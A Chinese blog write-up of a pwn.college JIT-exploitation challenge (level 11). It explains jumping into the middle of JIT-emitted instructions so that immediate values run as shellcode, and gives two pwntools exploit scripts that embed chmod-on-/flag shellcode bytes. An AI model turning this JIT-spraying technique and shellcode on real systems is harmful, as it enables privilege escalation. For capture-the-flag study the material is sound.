<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>这一关是Just In time（JIT），会将你的输入的二进制指令翻译为机器码执行，跟高级脚本语言的设计是一样的。规定了代码段、数据段。</p>
<p>但是可以通过短跳转的方式，跳转到原始指令的中间部分，这样可以通过可以操作的立即数部分，来自定义shellcode部分。</p>
<p>跳转到指令中间部分以后，还可以继续利用 <code>jmp</code>指令，进行短跳转到下一个原始指令的中间部分。这样就可以实现连续的控制流。</p>
<p>在shellcode的编写方面，还是借鉴了之前 <code>shellcode</code>关卡的部分，还是利用创建符号连接，然后使用 <code>chmod</code>系统调用修改 <code>/flag</code>文件权限获取 <code>flag</code>文件。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

imm 0x8
stm 0x20
sys 0x4

op      arg1        arg2
        register    value
        syscall   

a   0x20
b   0x1
c   0x2
d   0x10
s   0x40
i   0x4
f   0x8

read    0x20
write   0x10
open    0x1
exit    0x4
"""</span>


<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    b <span class="token operator">=</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    d <span class="token operator">=</span> p64<span class="token punctuation">(</span>d<span class="token punctuation">)</span>

    read <span class="token operator">=</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
    write <span class="token operator">=</span> p64<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
    stm <span class="token operator">=</span> p64<span class="token punctuation">(</span>stm<span class="token punctuation">)</span>
    open_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>open_<span class="token punctuation">)</span>
    imm <span class="token operator">=</span> p64<span class="token punctuation">(</span>imm<span class="token punctuation">)</span>
    sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
    jmp <span class="token operator">=</span> p64<span class="token punctuation">(</span>jmp<span class="token punctuation">)</span>

    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;d&#125;'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>


        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> write<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> open_<span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> stm<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> imm<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> sys<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> jmp<span class="token punctuation">)</span>



        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.0"</span><span class="token punctuation">)</span>


data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x808</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    <span class="token string">b'\&#123;b&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0cd</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x1f9</span>
    <span class="token string">b'\&#123;a&#125;\&#123;stm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>
    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#  jmp * a</span>

    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x900aEBE78948666A</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, nop; jmp 0xa; mov rdi, rsp; push 0x66</span>
    <span class="token string">b'\&#123;a&#125;\&#123;imm&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x050F585A6A5E046A</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment"># imm a, syscall; pop rax; push 0x5A; pop rsi; push 0x4 </span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x2</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level11/shellcode.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.0"</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token triple-quoted-string string">"""
/flag  ---> 2f 66 6c 61 67

imm 0x8
stm 0x40
sys 0x4
jmp 0x20

op      arg1        arg2
        register    value
        syscall   

a   0x20
b   0x4
c   0x1
d   0x40
s   0x8
i   0x10
f   0x2

"""</span>


<span class="token keyword">def</span> <span class="token function">format_data_list</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> read<span class="token punctuation">,</span> write<span class="token punctuation">,</span> stm<span class="token punctuation">,</span> open_<span class="token punctuation">,</span> imm<span class="token punctuation">,</span> sys<span class="token punctuation">,</span> jmp<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a <span class="token operator">=</span> p64<span class="token punctuation">(</span>a<span class="token punctuation">)</span>
    b <span class="token operator">=</span> p64<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
    c <span class="token operator">=</span> p64<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    d <span class="token operator">=</span> p64<span class="token punctuation">(</span>d<span class="token punctuation">)</span>

    read <span class="token operator">=</span> p64<span class="token punctuation">(</span>read<span class="token punctuation">)</span>
    write <span class="token operator">=</span> p64<span class="token punctuation">(</span>write<span class="token punctuation">)</span>
    stm <span class="token operator">=</span> p64<span class="token punctuation">(</span>stm<span class="token punctuation">)</span>
    open_ <span class="token operator">=</span> p64<span class="token punctuation">(</span>open_<span class="token punctuation">)</span>
    imm <span class="token operator">=</span> p64<span class="token punctuation">(</span>imm<span class="token punctuation">)</span>
    sys <span class="token operator">=</span> p64<span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
    jmp <span class="token operator">=</span> p64<span class="token punctuation">(</span>jmp<span class="token punctuation">)</span>

    formatted_data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> item <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>
        formatted_item <span class="token operator">=</span> item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;a&#125;'</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;b&#125;'</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;c&#125;'</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;d&#125;'</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>


        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;read&#125;'</span><span class="token punctuation">,</span> read<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;write&#125;'</span><span class="token punctuation">,</span> write<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;open&#125;'</span><span class="token punctuation">,</span> open_<span class="token punctuation">)</span>

        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;stm&#125;'</span><span class="token punctuation">,</span> stm<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;imm&#125;'</span><span class="token punctuation">,</span> imm<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;sys&#125;'</span><span class="token punctuation">,</span> sys<span class="token punctuation">)</span>
        formatted_item <span class="token operator">=</span> formatted_item<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token punctuation">,</span> jmp<span class="token punctuation">)</span>



        formatted_data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>formatted_item<span class="token punctuation">)</span>
    <span class="token keyword">return</span> formatted_data_list

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.1"</span><span class="token punctuation">)</span>


data_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    p64<span class="token punctuation">(</span><span class="token number">0x808</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    p64<span class="token punctuation">(</span><span class="token number">0x0cd</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;b&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm b, 0x1f9</span>
    <span class="token string">b'\&#123;b&#125;\&#123;stm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># stm *a = b</span>
    p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, 0x00</span>
    p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\&#123;jmp&#125;'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">#  jmp * a</span>

    p64<span class="token punctuation">(</span><span class="token number">0x900aEBE78948666A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, nop; jmp 0xa; mov rdi, rsp; push 0x66</span>
    p64<span class="token punctuation">(</span><span class="token number">0x050F585A6A5E046A</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\&#123;imm&#125;\&#123;a&#125;'</span><span class="token punctuation">,</span> <span class="token comment"># imm a, syscall; pop rax; push 0x5A; pop rsi; push 0x4 </span>

<span class="token punctuation">]</span>

payload_2 <span class="token operator">=</span> <span class="token string">b''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>format_data_list<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>read<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">,</span>write<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">,</span>open_<span class="token operator">=</span><span class="token number">0x1</span><span class="token punctuation">,</span>stm<span class="token operator">=</span><span class="token number">0x40</span><span class="token punctuation">,</span>imm<span class="token operator">=</span><span class="token number">0x08</span><span class="token punctuation">,</span> sys<span class="token operator">=</span><span class="token number">0x4</span><span class="token punctuation">,</span> jmp<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/home/hacker/exploit/level11/shellcode_2.bin"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/challenge/toddlerone_level11.1"</span><span class="token punctuation">)</span>
<span class="token comment"># 明确重定向文件描述符</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">美食家李老叭</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        文章链接:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://laobameishijia.github.io/2024/08/13/pwn-college-program-exploitation-writeup/">https://laobameishijia.github.io/2024/08/13/pwn-college-program-exploitation-writeup/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        版权声明:
                    </i>
                </span>
                <span class="reprint-info">
                    本博客所有文章除特別声明外，均采用
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    许可协议。转载请注明来源
                    <a href="/about" target="_blank">美食家李老叭</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tag/%E9%80%86%E5%90%91/">
                                    <span class="chip bg-color">逆向</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    
        <style>
    .valine-card {
        margin: 1.5rem auto;
    }

    .valine-card .card-content {
        padding: 20px 20px 5px 20px;
    }

    #vcomments textarea {
        box-sizing: border-box;
        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
    }

    #vcomments p {
        margin: 2px 2px 10px;
        font-size: 1.05rem;
        line-height: 1.78rem;
    }

    #vcomments blockquote p {
        text-indent: 0.2rem;
    }

    #vcomments a {
        padding: 0 2px;
        color: #4cbf30;
        font-weight: 500;
        text-decoration: none;
    }

    #vcomments img {
        max-width: 100%;
        height: auto;
        cursor: pointer;
    }

    #vcomments ol li {
        list-style-type: decimal;
    }

    #vcomments ol,
    ul {
        display: block;
        padding-left: 2em;
        word-spacing: 0.05rem;
    }

    #vcomments ul li,
    ol li {
        display: list-item;
        line-height: 1.8rem;
        font-size: 1rem;
    }

    #vcomments ul li {
        list-style-type: disc;
    }

    #vcomments ul ul li {
        list-style-type: circle;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    #vcomments table, th, td {
        border: 0;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments h1 {
        font-size: 1.85rem;
        font-weight: bold;
        line-height: 2.2rem;
    }

    #vcomments h2 {
        font-size: 1.65rem;
        font-weight: bold;
        line-height: 1.9rem;
    }

    #vcomments h3 {
        font-size: 1.45rem;
        font-weight: bold;
        line-height: 1.7rem;
    }

    #vcomments h4 {
        font-size: 1.25rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    #vcomments h5 {
        font-size: 1.1rem;
        font-weight: bold;
        line-height: 1.4rem;
    }

    #vcomments h6 {
        font-size: 1rem;
        line-height: 1.3rem;
    }

    #vcomments p {
        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table, th, td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n), thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/av-min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/valine/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: 'q5k1wXexowy7MeNN0CrLYpoK-gzGzoHsz',
        appKey: 'YmFtstASS0GUVRowdQQl4LPb',
        notify: 'false' === 'true',
        verify: 'false' === 'true',
        visitor: 'true' === 'true',
        avatar: 'mm',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: 'just go go'
    });
</script>

<!--酷Q推送-->


    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/09/04/pwn-college-web-3-writeup/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240606170337.png" class="responsive-img" alt="PWN-College-Web-3-Writeup">
                        
                        <span class="card-title">PWN-College-Web-3-Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-09-04
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/Web/">
                        <span class="chip bg-color">Web</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/07/30/pwn-college-memory-writeup/">
                    <div class="card-image">
                        
                        <img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240709193107.png" class="responsive-img" alt="PWN-College-memory-errors-Writeup">
                        
                        <span class="card-title">PWN-College-memory-errors-Writeup</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            CTF
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-07-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/category/CTF/" class="post-category">
                                    CTF
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tag/%E9%80%86%E5%90%91/">
                        <span class="chip bg-color">逆向</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/laobameishijia/laobameishijia.github.io@3.0/themes/hexo-theme-matery/source//libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


